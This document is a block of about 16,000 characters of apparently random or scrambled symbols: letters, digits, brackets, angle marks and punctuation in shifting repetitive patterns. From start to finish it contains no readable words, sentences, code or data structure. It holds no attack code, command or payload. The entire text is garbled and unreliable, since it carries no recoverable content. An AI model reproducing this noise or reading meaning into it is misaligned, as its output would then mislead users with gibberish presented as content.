1rD1Ut>D 88*)14t1S>8tESIv{>-m84L1ID>U-Svv( 4(>4-1v>v-4SDvU c8vtIDt 1-.It>ISrrU4S- >rU1S4xI(t8cr8U4>Ivt--I8-( S4vOu>IU>S4D>8-tc >1-1vU(S4vGSI+c((14>DUUScv  r.r4U1c4 UrS1v4c1t>US(1>tDSS8vk (t((>I8>6IIS>v- DwSrvc(14DvS(I4 D)-4trU vt U4r- SIvr >U>SS Srv1 IS1-t>c4+4rrIS>c-v((OvI8>vS>Iv>U-%84b1(I444U>c-rvc>4Ucv>(U4S(84(tcU1c( -r(DDt-r 1-U4c1 >v4 Dr-IStr-+rrt>-(8S+vI 48IStI-18t}t4U>-U I4>4->vU(Sv8rtUac1(14>DUItDtU4cc (;_->-cSc8 _cIvt8S41>>7SS8v_  d<IIr>8-18r(84dvR(-I1>>-UU4-tv8(1r Dvc1vt UU- 8cD1vDDoR811UD 1 tvc4 1r> rr-I(t-n8rDI>SrrU-4tUv 8g84( I>>U-SU-U(v4(v4cD((U4rDvU c2tccD 1r81ttvc8 8r8c1 rrU1Stv>rtrS 8(iSSD8SXvI >}S481r>(->S-Dv (gI4(8IrD1-Ivt YrSv4 14>DUUSt1t-cI(rr>1tt(c>(Sg(1r> v1 Df>I>8- c18SSUDUS>I-ISv-c4 1t^>4>-SIrr1>(D8-4v1(>4UDSIvISSl441(U>cU SvU D3v1>t(r>1rtSSv8 vc81rI11>vSD8U> -S84f1I>!-Ict(-8vt(1-1v4(U4SDv1rD(U-c>DIUSFY48I(8S- r4SUrDt(4(Srr;( c-.I>S8t r1(-U>Ir8UwD1Sc-vvS(6I4>114>IU4cUDcc J4GrUtI1 (r44mr&1-U1c> Uv8 crt14t--78rr11D8-I1rt>>414(gU c4v- vt^4I1>>DtDDUUc(I_1v>IU1ccDSU-c  C44 >4r1r -rv1 t-c4 1r>(UY 1c>DScvP5rS>v8ZSIv> D->8U?(I(GIrD^-Sc (84>v>(44SDvU t8U>cc(rrS1>U r 1zU4S41(rU1StvS>8ur411>1Uv8STcI DvS481L>rUD4-vv8(sIr>1t(vU8Sr4D U(v4(I4>ItUS-v81rZDrU1cD U5 1vD S- 4rI1>ttSSS8k rP>>S18D/UI->v>&v,N4Rv>>-tvS(S4 Ds-4v18c4UDSUvc  Or7D1U4>S -rv1 4Dc4 Ir>4U>SSv8-m)I t1-(8U(Ut4> --84 vI>>U-Svv D4ND8-1c((U4UDvUU t(4r(D>48cS cr 1ZU4Sx-Urt1StvDI8Jrr11D>-U8SZtI >vS4vSO>4>-A-vvt(Zr%>1->vU(SrID Ucv4 84>D>USc>gtri18U1Sr Ur-1vt8SW8 v>1DtUSSvtJ I(t4-oUU/tIS>v1Ivu)rI11>DIvS(t4 Dv-4c4(>YU8tUvc- Gr8D1>1cUvS!t1 tcc48(r>4-tSUvvS#LI8t1Sr8U 1IvDvUS84( I>>1-Svv( r Di-1c((Ur(DvU cd84r D>UrcS Dr 4DU4S48crU14tv-48gr411>1 48STII 1tS481%>4>>4-vv1(ir8>1->vU UrSD UDv48t4>DUUSSS >rp1>U1-4 UrS1v>v-I 4it1>DISS8v0 4 >tS1vU,Urt>v- vk {r->>U-vS I4 D*-4c44v4U1SUvSc y44D1t1   S:c1 t(c4 1r>I>1DSvvvF=rct1S>8U(UI-> U884 tI>>U-Svv U42Dc-1cI(U4SDvU ct(4r D>UUcS cr 4Sttc1 rrUr8tvS88N0-11t4DS8-gvI 1IS48I,>I1rv-cv (x8t>1-DvU8S tD USv4 m4>I8US-vv8r(1vU1Sh Ur11v>vS( 4%81>>cSS8v* rs>SS1v(TUII>vtIv0 Orc>>UXvS(t4 D{-4c4 >4UDrUvc- i44D1t1ct Sr41 >tc4 1r>1U>SSv8tR6IUt1S18Ud1 S>8-S84S-I>>t-SvD( 4vr1-Iv>(Uv(DvU8cu848(D>U4cS Ur IDU4-1-rrU11tvSU8MRr11>1-c8SEDI DvS481Z>rU1h-vvt(p4c>1>-vU8S44D U-v4 84>D>US-v88rp1cU1S( UCv1vD -v 4s81>trSSvrB roD-S1v(hUII>vU8vXH48>>D-4vS(>4 D--4S1cr4UD1UvcU 6(SD1D#UU -r>1 4Dc4 Ir>4StSSUUgl(14t11c8U.-IvDv4I84( I>>D-Svv( 4_rc-Icl(U4-DvU8c08d*SD>U4cS Ur 1NU4-1 1rU1ItvSS80(t11D>-U8STDI >-S4v-F>IU1;-vv>(MI4>1->vU(S4cD U-v4 84>1NUScv8cr{1vU1c1 Ur-1v>v>8 rd 1>D SS8vN Ia>tS1vhHUI->v-vvX 4rM>>-4vS(>4 1S-4S1 c4UD1UvcU u(UD1tlcr Sr>1 4Dc4 Ir>1UtSSUUAO(14t11c8Up-IvDv4I84( I>D--Svv( ykr8-1cn(U41Dvt c<vv4ID>U4cS->r 1(U4Sc >r1(vtcS 8Gcv11tDSU8>c I8>:S4t-{>It>StvU-(h4v>1-4vU U4vI 1cv4  4>D4US-v  (SDrU1Sw Uc(1vt8SWc>r1144SS-8v<  Dt4SI8>N1 v>c- vuc(I1>D-Uv1 S4 DJ-4cS(>4tDSUSc  v81DIU>cU8#rv18thc4tvr>1UtSSc8 _A14t1S>8UCSIv>>-F84;1I>>4-Svv(  8(I4>DgU(vIDvUvc.(441(t1rcS8vr 1<U4tItrS18cDv>Ut(-h8tD>>>>c--vc&c4(81xrIU>S-vD -88r(U4SvU(>4vD UZ1c-Ic8 1USS(  rOD4IrDrtvcD -&SUV-ASD8ILD1D>-9 I-t4S18>Sr8D(UIt>c-1c >>-rvS(v4 !84ID4U4cI(>r8SU Y44D1t1Ic Srv1 tcc4 1r>1UcrSv8 XK1rt1S18U01DD> -084((I>>t-Svc( 4vr1-Iv>(U4DDvU8c&  8>DDUUcS8tr 1(U4S4>-rU1StvSt8Rr411t>8(8S&vI >(S484*>rU4D-vv (!I4>1-DvU8S tD UXv4(14>DDUSc>9tr2D4U1SS Ur-1vt8SM8 v>1DtUSSvTW I(t4-FUU.tIS>v- v}lrI1D1rcvS(v4 D -4v1(>_UrDUvc  g44D1tEcUv1tN1 t^c4 1r>1ttSS18 Zv(1tIS>8UfSIv>8-!csUtI>>U-SvU( 4!>4U -8(t4-DvU cz(r41DDUUcSI1r 1iU4c1 >rU1StvS486r411t1SU8-%vIS44Sr81R>IU>S-cv (ZvS>1->vU(-4vD Upv4(I4>DUUSUv  rFD4Ur4c44IX>8SDt(-(811>>(SS8v+  rrID(>USIv8JII-D8T441>>-UvSc1c-(IIrD>Utc((>IS1(UrS 714D1>t>rv1Stoc4 1S( tZ81t8c_z14t1S>8U#S4v4 -3vDn1I>>U1t>t-4vc((r7S>c>cc -rcDct(4118UUcS v8c U4r14UDcD8>rtIv88S 8cSD4-4r8VSUc4S4vZ}>IU>S1(>8-tv1>1U(vU(S4v(t4c1 U8vr Sr1c- rvvUvvD trS -*vt St 4r11>4k1DtcS4vvpS>4tD->IS>S- v=h48nr>-Uv1(v4 DL1(DUU8vI vrUccI-UtUcUtUU4v48U(tMS- 1r>1U481cttS48-(OIrt1SDIvD -e84W1(D(I4>D88  STr44D-8U U 8rc18U8crD>t3cS vr (krI1rt8S1 rg8I)8j;v11t>SUtcS8(rs(I->>e>4(>S-vv U-vI(44cDDUSvc(c4cv4 C4>DUUS1DU8ct8 UIc> UrD1vt SQ-DSD 4rII 8- ro4>8 1t>>>U-4v-c4htU7c>>4I(t>->5DdU1v1(>4Ur14I1bUv8v cr11Dt>8- >rt1>tMrIU 41(8t(>vrS I U8U#DIv> -Bt -cv4(vIDvv(v4V>4-1>tcr4SDDU cK(481 S4t1rUtSv88t((81c1(1c1v i(r8I1rtU8D-4SvvS-8#(->k>48>S-vv c1vIWrIDDvSScz(8rtD8U44IDUUScv  rxD4-1tt UrD1vt Sgt4cI88h>It8v=II,t4S1U(SIv>4-I>>t->v,(1IIDv(v4tD!-4v1crcS(-4SD4Ucc D1t(cU Srv(crrIu>NSr 1wcSv8UCl14t1>I>--v8>uDI-v(71I>>U-SvvS Sv44-1vI(U4SDvrbDctc41D4UUcS vvS cPSIj >r11StvS U8S-vSrrSU8tTvI >3D->rvDIU>I-vv (<8v((IID1UccS4cU8v4(14>DUUScv  8+D4t c> UrSp-IUI UrSt rtDt rvUIvrD1tIr>v-8v>v- v9 i-8>>-UvS8-4 D;-4c4 -4UD-UvcS G44D1>>cD Src1 t(c4vEr>4U>SSv88^#1rt1-I8U SIt> -(84_II>>>-SSv(r4s>r-1vD(UrvDv> S1(44ID>UtcSvUr 13DSc1 DrU1UtvS 8Qr44-t>SU8S}vI > S4vCcUIt>S-vtI(5Ir>1t>cU(S4tD Uvv4vU4>1>c_cv tr&IcU1c> UrSIIt Sc 4R81>t>SS8>IDIk>8S1tcOUI->v- v#(  >>D-UvSSr4 D(-4S1 >4UDDUvcS xpUD1t1   SrD1 t1c4 1r>1U>rSv8-MOIct1S18U+1DD> -c84 (I>>t-Svc( 4vr1-Iv>(UrDDvU8cA  8>DDUUcS-rr 1(U4-1SrrU1DtvSS8s3>11D>4D8S#tI >cS4vcR>rUD1-vv-(o48>1tSvU8SrOD Ucv4 (4>4 USSS IrH1vU1S- UrS1v>vS1 4u81>1-SS8vi r9> S1v(=UII>vtDvm Lr->>U;vS(r4 Dj-4c44/4UDrUvc8 &44D1t1c> Sr41 >Uc4 1r>I>D Sv8IA%r4t1S>8U(UIt> -184 -I>>U-ScS(S4hDD-1St(U4SDvtvcv(4r>D>>(cS vr I >Ec18trU4UtvS 8a(XtSt>-U8S vI >ES4v4IvIUD--vc((2I4>1U1-I(SrSD UUv4(14>1>>8cv8cr/44U1c> UrSIIt S- 4Er1>tUSS8v(1I=>vS18>)UI->vtUc8{44(>>>cvS(c4 IS-4cRSU4tDSUv-r O4rD1U4>S -rv1 4Dc4 Ir>4UIDSv8U%)I t1SI8U Src>8-S84( I>I8-ScS U4TDc-1--(U4SDv> S>(4r8D>UrcSvIr I t c18 rU1DtvS 8*(<ISt>-(8S_tI >_S4v4 8IUD#-v-z(OI4>1->c4(S4DD U>v4(44>D4IUcc Ur*(tU1cD UrI1vtS>4 rr11>r8SS8c+ r.48S1v5NUI>>v-cvP 48(>>-4vS(>4 1 -4c4(14UDIUvcS N44D1>>cI SrD1 t-c4v>r>4U>-Sv8tKnIct1UD8U Sr(> --84(8I>>r-SSv(S4wDc-1c((U4tDv> S((4r8D>UrcS8Sr 1M41cI8LrU11tvSt8i(4((t>S48S;>I DQS4S 8>It>1-vtI(OIr>1> vU(>8 D8UWv4--4>DtUSSStrrb1vU1Sr UrS1vt >- r5 1>ttSS8cM 4 D8S1vsgU48>v- vX 44S>>-rvS(U4 D8-4S1 t4UDIUvct x(ID1U>Sc Sr11 tFc4 1r>1UtrSv8tBKIct1- 8UxS41> -S84}4I>>t-ScSvD4.Dv-1cv(U4SDvU cc(4r D>UtcS Sr 4!Urc18*rU11tvUt8#(4Ict>S48S.>I D(S4v  -IU>1-vtv(EIr>1-DvU(>8 D8U=v4S44>DtUScU-Yr(D4U1Dc Ur-1v>vII 4, 1>DcSS8vy r<48S1visUI1>v-UvL8v-U>>-4vSSr4 D(-4- (>41xvUcc  %vtD1UDcUvS8t1 tSc48fr>IvtSUv--BYIvt1-Y8U DIv1U-(84( I>R8-Svc( rS>4UEtU(t4SDvIIcP(r41D4ISc- vr *8U4cI >r4IUtvS 8XoU11tDSU8UZvIS44Sr81u>4 >S-cv (AvS>1->vU(-4vD UTv4(14>DUUSct  r0D4U1SU UrS1v4-I:t cI84rI1cU-S-vv( Ic>USrIS>D- vzX4v8Er41>I-tcb S-4c (>4UDS1-1(U4cv cr(cU 1rv1 t/>D>cvU tF81t8 (v14t1S>-t-DvU((tkU -(vI(14UD8UDJJr r(DU-rvD 8r0c>(441D>t>D1 cr81Rtkc1 >rU1St1S 8(r41It>S>8S v4S>wSr81KDIU>t-vc (rI4>I->vI(S4vD t c (14DDUU-cv  r0I?>8c> >rS1St Sd 4r1IUtUSU8vJ8Ia>0S1c>vIIS>S- v 644_>>-Uc (v48DRUPv1(D4UDS41c  h44DIU>cU Src1 t0c4 1d 1UtSSv8 +-14t1S>trSDvU/tIc>1U I>>1-Svv( c-Mr4cD4(U4DDvU c*U4vr(Drv1  -r 1PI1- c8 S>8ISS 81r411t>>t>D-Uv(1eD >(-Iv1(U48DD(,4 >1->vU-Ivc(r4cv4 84>DUUS>vU4c( (r(>8U1rS1>t S/ 48r8tBS11tISt4ct4S18>(>c8>v- v9(;I1>>-UvSII4 D:-4vI(>4>DSU>8t B44D1UrcU -rv18tTS ->rD1UtSSt8 #(14>#DU8tESIvDS-:8rf141 c-Svv( 4(>4-1v>(U>rDvU c^(r41D1UU-SStr 19U4c1 >o*1SDv>-8=r411t>SU8D5vIUU-S481u>4v>S-cv ((I4D01Uvt(S4vD4U{vr(144TSU-cv  rpD4UIc>8>-81vt S#8vr11>tUUS-tw I/t4S18>srIS1>-8vE?4I1>>-Uv-(v4SD=U t>(D4UDSUvc  (4414y-cU Srv1ct.c4 1r1wutSSc8 Ma14t1S>8U( Iv> -CvsG1ID>U->t (84X>4-1v>(t4SDv4>cJ(441DDUUcS vr 1(U4c1 >yU1StvS 8.2(11t>SU-r--(8>K-181:>IU41IIDh-v v(c41DDU> -(>4tD>Up4>1UUScv  8U88rtDDtSSc IrSD tISD844U1->S-SIFD8S18>.U 8=c4>U(-(c/(844>-UUvD(r41tbU8cD >4c1eU8c8D1t-cU Srv5SrcI(>xS18-YrDv>vSr8Di1I48U( Iv> -*t(-(v44t4>DUUvvt(ur(D4-I4S1-U cb(4c  8r>DDtvSv r2S1ct-S(8>pII > SI8t6>I18SdII >3S4tDSt(I(vIt>r-tv8(r->v4(S4vD 4tD4-Ic8 >rtc-  riD4U1c>t 44Zvt Sv 4r11>rr1->(S-In>vS18>=U8ck8Dr>(--v>>>-4vS(v4 r84>Dc-rcS >UvcI J44D1I(DIt>8- >rt1>tYS1 IPvSv8-R+14t1D->-S>8tL4-ov-m1I>>U4ID8UvvD (41>D-DvDI-U cy(4r4c(UUcS vrD1GU4c181er1StcS 8Dr411t>UUvS=vI8>+Sr81(>IU1St(v ((I4>I->cv(S0v1aUGvr(14DDUU4cvv ;>D4UIc> trSI(t U98vr11DtUS-8v(xI)t4tv8>OtIS>S- vEW4I11c-UvS(v4 DfULv1(48SD-Uvc v.44DIU>-U8Srv1-t*S  1rD1U>U 48 _-14>DS>8UPSIvDD-&v8X14(>U-Uvv(UDt>4U(v>8U4SDcU c&(4r!?UUtcS v( 1dUrc1v>xU1SttS 8vr414t>->_VfvIt>)-(81s>IU>SUIv (cI4D8->v>(S4>I4U+cv(1!(DUU-cv -rG1 I>cD UrSIDt S( 4(1I>tUS18vh-Io>QS1v1I IS>1- vc64I1>>-Ucr(v4UD,USv1(14UD1cIc  S44I1U>ct Srv1 tv>1 Ir>1UDSSv88Ri44>1S>8rLSI>> -S84(4v4>U-rvv(S42>4-1c1 44SD4U c>(441D>UUS( vrt10tUc1 DrUIU>>S 8-r4I8t>SU8S_vI>>e-S81(5IU>S-vv  SI4D8->v>(S4cD USSk(14>DUt<cv 8r/1CU1c4-Sr-1vt S> 4rI1>tU148vR I*trS18>aUIS>v- v<s44 >>-UvS(v4UD9-4v1cIc- v4>DDU-441>U>cU Svt8 rvDr>5cr -4t1t>S-v8-M>I(8U,UIv> -_tIc8I>>r-Svv( v-(8rzD(-Icv >U cS(441D>Ic1r- c8 Ir8c18crU1Stv>8>v-  IrII8cSc(v(/vI8vUL>IU>SUSDr(KIr>1-IvU(S4v1 r v4(I4>D4UScv  M  vUIcD Ur>1vt SB 4rI1>ttSS8c) I t4U1v2xUI->v-8vK&rI1D>U vS(c4 DS-4v1(>r>DUUvc8 ^r5D1U>cU8UrI1 t c48Cr>1UtSSvv(w%I?t1SD8U0UIv1 Dc84o4I>>>-Svt( 4dD>-1vD(U4UDvU8cX(4cvD>UUcS cr 1?U4cI >rU1StvS>8Rr411t>-U8SpvI 4(48D_-trU41IcDv-Ir4444tDDUtvt cU}cv(14>DU1t18tWcS -r8c> 1rS1vt I-UrSc84tUSI8vX I.7cI(>4Sr8D( 4Uvb(DI1>>-Utt-tv4(c4(1x8> > cr-1cUcS(D1U1cU Srv (I-c48cr>1UtSD->;S(8t?(U>UcS-v > -c84)1I>(UIt>c-4v11c-1v>(UrU8(U cM(44rD>UUcS vDD1PU4c1 DrU1UtvSU(-r411t>SI8SYcI >(S4v0cUIt>S-vv-(EIr>1-4tS(-4vD tSv4(I4>1>l8cv  rl1 U1c> UrSUIt SG 4rI1>t>SScvv-Ift4S18>)UIU>vt UcN4I1>>-UvS(c4 DSScv1(>4U1 Uvc8 /4rD1U4>S -rv1 t1c4 Ir>114vSc8 B)14t1SD8U(Uc(> -L84( I>>U-SSvc-4x>4-1v>(U4DDv>Uc((441D>ttcS cr 1-U4S3-Urt1Stv-88Krr11t4DS8-BvI >7S48IA>4> 8-vv (b4S>1->vU(1zID8U(v4(14>DtUScc  rV-SU1c> UrS1vt S/ 4gU1>tUSS8Sp I(t4-7UUftIS>v- voTrI1>>4^vS(v4 D(-4v1(>4UD-Uvc  a(4D1U>cU Sr>1 t&c4UDct(cr-1I>QfgIct1S>8USI8t(SI->8->c;>D rvS (4?vU8t41IS4S1(U c9(48r(rrvDDU-SS4EIu1DtISD Di-S 8vr411t>Dct-SIvx>o-t816>IUr 48>c-(v>r14S>tUrvt vU!c-(14>DUIt1 U8cD 8>1>-UtSv1vttS& 4r1Er_S1-tSS48ca S1v8/UIS>vD>>cSrvU(44aUU-ccvDCUSv1(>4UkSr81cUtS  crt1S Sr>1 tzc4SrSt8Sr11Itti8-&r4pSr-SrU8v>8o8r01I>>r-Svv( 8e(>II18-IcU -U cc(441D>I1DrtUc4 ct(SdvDc(US(Ur(IS8411t4SU8S9v cnt4U>(<IIU(8ttS >UIvU4DtvU(>4vD UODc-Ic-(IUSc>  r_D41r1St(cD8 WSS8 4r11>tUSS8vj (7>(1Dc4vv(S84 r4 11Ir1v8S 4D8U3-SS-%D(>4IDSUvc SIcI G4r1v SrI1 tCc4SrS  tRU1ctc-v88p4S>vU:SIv> D(D8UOvt1UD1>cUvvI14D4DtUDct(trcc8(441D>UUcS v4 rrt(c1 >rU1StvS v!8411>>SU8SPv(>(cIDtI-Uv-mrIUtv-rvI C1>>tUUcUDcU-r(8- >1 -(I84Hr_1 U1c> Uv> tX>Iv8(r11>tUSS8vc cvI4S181EUIS>v1StBG44(>>-UvSUvv8(tr7Dr(>rSDSUvc SSc- >44t4UrSS8cwv>(tvS88vr>S-1D IU1cD4ISDDTt > -t84&1I>H-IcUtU7vc(D4c>rUD4SDrU cs(488(rr1ttU1cD 1r 14UrSS1St-S 8_r4(c6I>t8t:v8r1cU4IvhHD>Sc-vvv(}I4>1ItUr(trt8r8cnI1r(4r41Scv UrpD4U1tIS4SU crr1c 4X81>tUSSU>S-88( ID>18DIS>I- vf24 t!DIrDv-IcS c4 D((>41DSUvc t-vr cr4cU trv1 t;11t(-(1UtrSv8 +yvcpDI1>8-tvvs8I8>8SDI>>U-ScS>t4R>4-1S1(U4SDvtvcI(44ID>tDcS vr 4Vt c1 DrU1-tvt 8Z(41rt>St8SYcI >(S4c1(UIU>--vv8(?j8>1t>c>(S4cD U(v48?4>IUUtcv 8rODrU1U/ UrS41t S( 4r41>tUSS8v(IIft4S18>xUIU>v-SU4erI1>>IvvS(c4 IZU4v1(r4UD>Uv-t jjPUSU>cr Sx11 tFc4 1(81UtDSv8ty0Iht1-o((ZSIt> 11840II>>U-SvUSR4(>4-1>S(U4-Dv> S#(4r(D>U1cSv-r I cUc18(rU1rtvS 8Fr44ct>SI8SZDI > S4v r(IU>D-vc-(NIr>1-DvU(>8 D8UNv48(4>DtUScU-&r(D4U1DS Ur-1vD >c 4<(1>t1SS8I# ri (S18rbUID>v--v} 44(>>-IvS(t4 Dr-4S1(I4UDDUvc- T/ID1t1S> Sr>1 D(c4 1r>I>trSv8te)rtt1S>8U SID> --84(8I>I--ScS(14jDS-1cS(U4SDvtv(S(4rcD>D cS vr I tvc18vrUIStvS 8!(!14t>-88S(DI >AS4v4(8IUD -vSS(3I4>1U1cc(Sr(D >Uv4(14>1>t>cv87r21(U1c> U3U1It Sr 4(-1>tUSSvS11I+>4S1chXUIS>vUvp>044I>>U>vS(v4 1 D8v1 14UIvUvc  o5gIvU>SD S3D1 tAc4 1(c1UtISvvc3/14t1S>v XSI>> -e84&II>14Uevv(-4TID-1vD(U4IDvUSt4(r41D>DccS cr 1vI1cI >rU  tvS88W(4((t>S48SpUI DIS4c1 DIt>1-vvU(T4r>1U1cv(S4DD >1v4(14>IUUIcv tr*1cU1Ut UzUI t SU 4(U1>tUSSvS(8I3>-S1cSKUIS>vUvvrT44S>>UIvS(v4 Ddt>v1 (4U1+Uvcv PrvW4UDc4 Sc01 t(c488r>114vSc8 :b >t1SD8U S(t> -S84(}I>1c-SSvS-4JDv-1c)(UrEDvtvSc(4r8D>tDcS vr 46t c18(rU1Itv-Z8#(448t>Sr8S!DI >SS4c1wIIU>I-vvt(9r->1t>c-(S4DD U-v48t4>IUtScv tr_1cU1Sv UrS  t8SS 4= 1>trSScvv-I+>vS1vspUe8>vtU8I<44 >>D1vS(c4 IX-4cySU4tDSUvtS Z4rD1U4>S -rv1 41c4 Ir>I>(8Sv8U}Hr1t1S>8UiS(D>8-S84EII>>t-ScS D4lDv-1SD(U4SDv> cU(4r8D>U1cSv(r 4wtrc18(rU1ItvUI8?r4I1t>-_8SQvI >JS481(SIU>I-vvt()4S>1->c (S4>D U v4(I4>1>Drcv Ur21XU1c> UrS1It SS 4rI1>t>SScv(-IB>vS1v#7U4(>vt v(f44 >>-4vS 44 DSU8v1 b4U6tUvc8 =4rD1U4>S -rv1 48c4 Ir>114vSc8 OE >t1SD8U(Uc(> -S848cI>>U-SSvc-4xDv-1c+(U4>Dv>Uc((4r D>4YcS cr 1-U4So-Urt1StvD>8!rr11t4DS8-uvI r1S48I9>rU4D-vvU(C4 >1U8vU8S tD USv4  4>1GUS->D4r%1vU1t4 Ur-1vtrS*8 v>1DtUSS-Ub I(t4- v1YUIS>v-1vzmrI1>1-Uv>S 48Dm-4cS(>4tDSUvD> j44D1UDcU Srv1 t,c4 1r>I*tSSv8 lxI1t1S>8Uct8tJ4Ic>(Uhr>rc4cD Uccv(844v>(14SDvU 1--rcc 4UUcD vr 1)r4DrUDSv8 tvSU8kr411III->vS>8Dw-S4v8m>IU>SID>-Uvvc((4UD4(S4SD Uwv4-D8(DUUrcv  r=rrH(14t-(SH>r8I tDr1IdtUSS8vv-8Ie-I>tr-v4D>v- vR lct>>-UvS(S4 Dm-4v1484UDSUvc8 ,r2D1tx8( Srv1 >vc4 Ir>1UtSSUUFZ(14t1-48U!-IvDv4I84:1I>>I-Svv( 45---1v>(U4-DvUvcu848(D>UUcS vr 1vU4-1SrrU1StvS 8flc11>Gvr8SNvI >DS48I*>It>S-Uty((I4>1UcvU(-4vDS14vr(14>DUUScc  w 8DU1c> Ur11vt S,v4v(1>tUSS8vf I(t4t IS9UIS>v- v%LrI1D -Uv>S 48DC-4v1(>4tDStS1r ,44D1UIcU Srv1UDtcr Ir>1UtSSc8 C(14t1  8U!SIv> -:84&1I>Dv-Svv( 4 >4-Iv>(18vDcU c2(441DDUUcSU1r 1kU4cI >rU1StvS88Gr4111tSU8SjvIcSc18>(4ttI U(v2 (e41>1->vUc1vI ;4vtvUcc1 Dr>t-U>ct >rEc> DrS1vt 14t8-81>>(SS8vl v-AII4>c-DvSdcIc>cG44c>>-UvSc-v>((rF>I-Ic1(DrSc  -44D1U>>Ut cc8DrcIGtrrIUI>(-(- I(8t I>U8UlDIv> -BUD-D84.I4 vv(U4{>4-1UIUvvr(tr/1v(4rWD>UUcS--cD8>r8c1 4rU1Stv>rt(S-8>t>-(8S,vI 4UI8tI-Sv1W4DS>8U I4>r->vU(S I c1(v4  4>DUUSt-t(c4 vrc1( D-TtSUSrrUv1t>ac-SS8I) Ixt41DttvIvvQtIr>t-8vr>>-1vS(v4 (-IrDt-r4UD>Uvc  _v  (a 11 SrD1 t6c4-(SU trUINt-Sv14> S>8U=S88C(DItr-cvU>U->vv( 4. cIID8U14SDSU c.(4vD/(UDcS vr 1GU4>1>48U1S> S 83r4(rrrIvtDS-vS1oDD>D-UvD(>ItDv(88D-cSUv-U 1>tr8rc((rcIc(1ctrD 81r4U1S8 UrS1vIr1(tcS>88R1IDtUS-IM>8S18>EU ><I4S>1-8Ir vv>8>D88U-IcvUD(I-r-4S-I(Uc( vO1UcU Irv1 tB1ct(S4 rrDI >UMOISt1S>8UcSv8(cItD -cvt(S-Sv>( 4l>4DrtsU>v- (4-c, -41D>UUt-ttSS r>4> UDS>88tvSI82r4114(1I>>v-8>!tI>>#-18I(v--1 8U>(SDtS1v>1  DcUHv4(14>DUUScvS r)14U1c> U848trr1(t1SD88r1DU>8-(vv441I>1-1IS>t- vF!4v1gD4(DUU-4 D -4v1(>81mSU--(B>1IDDc>18D-8 1 t-c4 1r>(4rD1->SSrvM1rSD8UetIv> -e84u1I>tUDcv-SIc1DUr18DvUUr-vU cD(441D>Iv1cU-c8 1I41UUD-( D{SS 8Sr411t>>I>8SIvR<cI>tUC>IU>SUSIt(ZI4>1>(vU(S4v1vU(v4(I4>1tUScv  (m1IU1cD Ur-1vtSSwv4{(1>ttSS8c_ 4vt4U1c bUI->v-8v_(4I11>tKvS(c4 D(-4cc(>OU1,Uvc8 C4rD1>IcU S(11 t(c4 4r>1UtSSvvIy=14t1S>8UlUIv>SD48rH1I>x(-Svc( 5.D4-1vr(U4>DvUrc#89DSD>UrcS 1r 1wU4c1v8rU1DtvSt8b6s11>Xv(8SPtI rtS48I?>IU>S-UtG((I4>1I8vU(-4vI tav4 (4>D1UScS  + UUU1S( UG 1vt Sk 4(c1>tISS8D^ I t4- (8=UID>v1DvG#rI1>>-Uv>S 48D_-4>c(>4tDS>vt- wr8D1U4cU8 rv4 (8c48(r>1ItSSr8  24tt1Sr8UHDIvD4-=c4(tI>>I-Svt( r >4U4vr(U41Dv>>cs(44111ttcS Dr 4(U4c1 >(U48tvSt89+c11tISUvUA>I >US4Sth>IU>SUS/U(P4->1tvvU(S4v1vU8v4 S4>DtUScv  H IvU1Sc U^r1vt S9v,((1>>vSScUK I)t4-4v4JU48>vU(vga4I1D1UtvS  4 D--4v1(>r>1vUvS( %(>D1U>cU8UD41 >gc4ccr>1UtS-Sr1kXIrt1U-8UySIvDv -84(4I>1S-Svv( r 1>-1cI(UrrDvU cl(4M8D>UrcS8-r 1mU4c18>rU11tvS 8Wrr111b-c8S0tI rtS48IZ>X->S-UtO((I4>1I8vU(-4vI 1cv4  4>D1US->  (.IrUIS< Ur11vt1Sbvj(v1>trSSc4& Igt4U1v(fUII>v-tvN((I1D1-tvS(14 Ic-4v1(>r>1 UvcD n(8D1U>cU8Ur-1 t>c4cUr>1UtSSv81BkIct1-v8U0UIv>U1 8r( I>J(-Svc( 4->4UBtU(t4SDvIDcZ(r41I>1IcS >r 1vU4U  >(U(DtvSU8N<v11D>SUvU( I >-S4vIs>IU>Stvv1(a4c>1U(vU(14vI U v4 84>DrUSU   (A1 U1S( UrI1vt-S6v4(-1>trSS8D) rSt4U1v%<UII>v-tvM 4I1>>ISv-(>4 DS-4c8(>9UrDUvcU nrvD1>ccUv1 v18tSc4Ucr>1ttS-D8 mv(1tIS>8UcrIv>8-pc}UtI>>4-Sct( 4&>4-1t((t41DvU8c}(r4111t4cS >r 4UU4c1 >(UI8tvSt8<f 111uSUcS31I >-S4v8o>rt>S-vc((A4S>1->vU(S4vD U v4 84>DrUSc1  r?1(U1S; UrU1vt8S3v98c1>t4SSc8} IJt4S1vrQUI1>v-8vy(VI11>tcvS(>4 DS-4c>(>3UDUUvcU ^rvD1>1cU 1?11 tSc4-1r>1ttSSc8 Ev(1tIS>8UcSIv>8-Mv c>ID>U-StI( 4(>4U41-(U41DvtUcd(441I>1IcS >r 1SU4-v >(4S tvSU83c-11tDSUScWvIS44Sr81w>8(>S-cv 8y 8>1UEvU(>4vD4UKS4S(4>D4USc>  M8D4D cD Ur11v4DS* rr1rctUS>U *8IPt41c8>OtIS>U1_v(z4I14D-Uv-(v4U1 -4v1(>r DSUcc   4417IUct Srv11tgcr 1r>8KtSSv8 G(14t1S>8ULSIv> -avSH1I>>U-SvD( 4a>448>rU1vI(trH1S(444D>UUcSU88t1:> c1 >rU.-htIStr(4(rrrISt> v  Lc4 c1vDv1(>Ic>c-DI4DH->vU(S >(8r81 (144DUUScvttc( -Exc>88rS1vt >(> -Z DrDI(cvvr8rT I(8>R4IS>v- U8-Iv>(w4(>I(v4-DF-4v1U>vD(-r}D48S44D1U>S>>8rv1 t_S8 1r>1UtS I8 3}14tIS>8>!SI>Ut-68431Ir>U--vv(84eD 1>vD(U4SDtU c((4ruFUUtcS vm-1BUrc181-c1StvS 8(r411t>SUrr6vI >6Sr81m1IU1SDtv (OI4>1->vr(Sovr-Ulv4(14>DUUtcv U1tD4U1c> UrS1ct Sw 4u:(UttSS8vT IRtrS1v1UcIS>v- v i4I1>>tUUD(v4 D}-4v1 {4UI1Ucc  ,4411U>ct SrU1 tv>1 Ir>1U>SSv88fLI 4>SD8UgSIv> -(84(4c->U-Svv(>45>4-1c5v(4-DcU c^(44ID>UtcS v>>1?U4c1 >rU1StvS 81r411t>S>8SocI >vD18IQ>IU>S-vv8(OI4(v->vU(S4cD UNv4(14DDUUScvc(r+D4U1c> rrS1vt 1-t8-g8(rIIv>>K I(t4S18>((IS>U- vlQ4 1mr41Dt(-4 DJ-4v1(>4U>S18c  U44D1U>>UtcS- DHv1-tDSU1Ut>Sv8 